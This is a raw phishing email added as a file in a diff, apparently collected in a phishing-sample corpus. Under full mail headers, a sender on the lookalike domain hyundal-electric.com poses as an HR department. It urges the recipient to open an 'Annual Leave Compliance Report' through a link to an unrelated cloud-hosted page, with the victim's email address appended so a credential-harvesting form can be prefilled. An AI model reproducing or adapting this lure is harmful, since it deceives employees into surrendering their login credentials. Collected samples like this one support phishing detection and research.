@@ -1,0 +1,100 @@
+Return-Path: srv2.cpsess046-noreply@hyundal-electric.com
+Delivered-To: jose@monkey.org
+X-FDA: 82220906418.35.3CB7E3E
+Received: from slot0.hyundal-electric.com (slot0.hyundal-electric.com
+ [91.219.150.228])	by imf09.b.hostedemail.com (Postfix) with ESMTP id
+ 29018180003	for <jose@monkey.org>; Wed, 12 Jun 2024 04:09:07 +0000 (UTC)
+Authentication-Results: imf09.b.hostedemail.com;	dkim=pass
+ header.d=hyundal-electric.com header.s=dkim header.b=QTv9PP4s;	spf=pass
+ (imf09.b.hostedemail.com: domain of
+ srv2.cpsess046-noreply@hyundal-electric.com designates 91.219.150.228 as
+ permitted sender) smtp.mailfrom=srv2.cpsess046-noreply@hyundal-electric.com;
+	dmarc=pass (policy=none) header.from=hyundal-electric.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1718165348;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=Q2tDFz65ENQ0dgie8OjMRG32cT4P+spXu7zsLD82qqU=;
+	b=kYVlA/9rN1AgfVoY1+z3XgQbDZaDNgu8m8P2Umn9fjT3znn8/+BBRaeABsWW4Hbr6iug66
+	cyanYGaAvVhmZgNVrWKkfcr9a59WErkA4FdK39Vw2Z8/c2a/1MH3+wsApnB5h7kW3stLea
+	Q5f47RUyfKcbSVeT/6BnzDNZjpzuY9I=
+ARC-Authentication-Results: i=1;	imf09.b.hostedemail.com;	dkim=pass
+ header.d=hyundal-electric.com header.s=dkim header.b=QTv9PP4s;	spf=pass
+ (imf09.b.hostedemail.com: domain of
+ srv2.cpsess046-noreply@hyundal-electric.com designates 91.219.150.228 as
+ permitted sender) smtp.mailfrom=srv2.cpsess046-noreply@hyundal-electric.com;
+	dmarc=pass (policy=none) header.from=hyundal-electric.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1718165348; a=rsa-sha256;
+	cv=none;
+	b=K8tBDi/NV7x6keFhluhbP4H/kX4jA7kux5kbW2iqmrGpAF/nEm5MTjWxKCbFN/NRctS3Dl
+	e7rmZN1XtO2pm3f1vix4PaFR01mqJBid3YbjbrkDcNxAeX/HOn/nBZCQJBRJgOacGEJPHH
+	P2M2T6X+qs5cbLECPyCMLsoR+54IT1c=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=dkim;
+ d=hyundal-electric.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=srv2.cpsess046-noreply@hyundal-electric.com;
+ bh=Q2tDFz65ENQ0dgie8OjMRG32cT4P+spXu7zsLD82qqU=; =?utf-8?q?b=3DQTv9PP4stzSm?=
+ =?utf-8?q?97FBu4hsryqq5SJ/LsSU+B54GjqCKl9+8pwaWOU5MdRpbkyBdF+o3MX6WNnuveCm?=
+  
+ 2W9nCmBd1eoJItQYIiCMDBEIjhSefbYU6H8OZO2+QIaBjIDu6g4KZM5Aye0bmv+XhpgbP3jkoKDV
+  
+ G/caAQq3GHG8lYYD4gOq57M83Y6RUOsPQq0ovl8pxUDtyZYsiYpor+hwA6tUOxHFDSzTwnVUpOb0
+  
+ efDCXsnlf+q8xtC8HsFfEr/ieJULmS4DthTdB1gO1RncG34fL48AqlMtm3bnlpMaMc4GDjiF7wWa
+   ThGftHIb4NkI0cVabrh786tgnCe4mKeI6yjaQw==
+From: "HR Department"   <srv2.cpsess046-noreply@hyundal-electric.com>
+To: jose@monkey.org
+Subject: Annual-Leave-Compliance-Report-2024
+Date: 12 Jun 2024 06:09:05 +0200
+Message-ID: <20240612060905.D8A0A64C2C1C89DB@hyundal-electric.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspam-User: 
+X-Rspamd-Queue-Id: 29018180003
+X-Rspamd-Server: rspam04
+X-Spam-Status: No, score=3.52
+X-Stat-Signature: 7g49minhphnrxu6qx5uwhka9kk4ze4f1
+X-HE-Tag: 1718165347-225194
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1+QF+KinctYFMkR/VxYJffBXfYcghLxTm4zEXHPQEfPQpF?=
+ =?utf-8?q?QLEdzz/MGiHMjwM7STfezfbhYvbgBQZASxUfTj5muYc6CD1pLiBPi8/8MxadV7/CB?=
+ =?utf-8?q?xqTde4aSKnXrb6gqPRqSJ4yBhjbTfB5Mvv4xTJH6jpEENj9K5YuZA4J6IUGON0BzE?=
+ =?utf-8?q?QE1wYzhDAE9lU6SP86w++0mfMZPurr3ZleKUGQzBQUWWk5lw4whBy919IojyCXd9b?=
+ =?utf-8?q?bC84hyi8VIN8l5ej6OZlrOhKmGTamE2qHrKMrGXA1HrSyj1qlH56hO+ugxitcITAJ?=
+ =?utf-8?q?q1MU7an03pn3wAQ9mL31TmMbAY73rj525mmfmuQnc3I8Yaa5zmz+XHKMUJPA3Xdap?=
+ =?utf-8?q?SA3fWGh8lFkwa9frUOMJu0/TERDiJ9CsaTupiQvODs7lnlMyYaBjjrVPmLEPe6Rj6?=
+ =?utf-8?q?Mh0USOkwFe+v0cU17j4TiHehSxQuzFAF6xBYd+t0NaTVeIsqSEDNrua+QDoRIqXfQ?=
+ =?utf-8?q?rNfz26EzGIRfHoiPhuaRm+Z/EHQiSmsBF3y3I8w5nF/aR4/vYOaz0lP/nPNCDaqa4?=
+ =?utf-8?q?dv/SeKypYq87W0OGOGfU42Tctx94H5TK3FfRf6lM0Jz1lz8GBTVxyfZ6cc0vUtfW7?=
+ =?utf-8?q?dQl5zkVXdLIiT2YcofaIydY9qcZXzic/YBwOjW/1vTNacXRv4Vl/8UPIHndMLw8Bh?=
+ =?utf-8?q?rgWA0/PhZYSn/idVVyXqoXkdZZEW4bj7LEJRwG+VqG89vyLzau+VMVRX2ZgmxymDW?=
+ =?utf-8?q?8UVdasmPrCW0XUkzKf5KVWTZnVB1NbI6fU1z2UWtHDaLj6lVd+7tgPzO+mI3H3Uf/?=
+ =?utf-8?q?iKrih51X05uoO8ZZJmy3b44rtHJAA5QZ1F1LetdO6rGPxOA4yBoSW7Rup5Ti3/C50?=
+ =?utf-8?q?J1UCB1nIht+NnPXWzmP9qIaeOn0MZCya9C3hZddBj8qnlhmy7SyXNKEqWHSc2zSDO?=
+ =?utf-8?q?ItQsjacwVfnxZVYbfevetR_4PadhB/TXOqJdBpAgnfFb61goCMsR7beaNptvSaofs?=
+ =?utf-8?q?D1YQhamq1Je6s+fr9xAgyMAlpsytKI0uFgxj/H53HOUVc8CLbG0X8F4OEd0Y93ngH?=
+ =?utf-8?q?T81YawY44Ei+iA+c4f0M+Jk0I1?=
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 179
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body><p>Hello<br><br>The HR Department has released the annual Leave Compl=
+iance Report for 2024. You can access it via the following link:<br><br>
+<a=20
+href=3D"https://employeesxls.standard.us-east-1.oortech.com/indexX.html#jos=
+e@monkey.org">2024 Annual Leave and-update.staff-information./company/emplo=
+yees/.xls</a><br><br>Please do note that all names highlighted in red are t=
+hose who are yet to comply to the Annual Leave Plan for 2024.<br>
+Names of employees marked in Green color have met all the requirements for =
+the 2024 Annual Leave Plan<br><br>Should you have further questions, kindly=
+ reply this email<br><br><br><br>&nbsp; &nbsp; &nbsp;  <br><br>Thanks &amp;=
+ Regards,<br><br> Human Resources<br><br>Memo Desk&nbsp; &nbsp; &nbsp; : HR=
+ Department<br>Endorsed by&nbsp; &nbsp;  : Director of Human Resources</p><=
+/body></html>
+
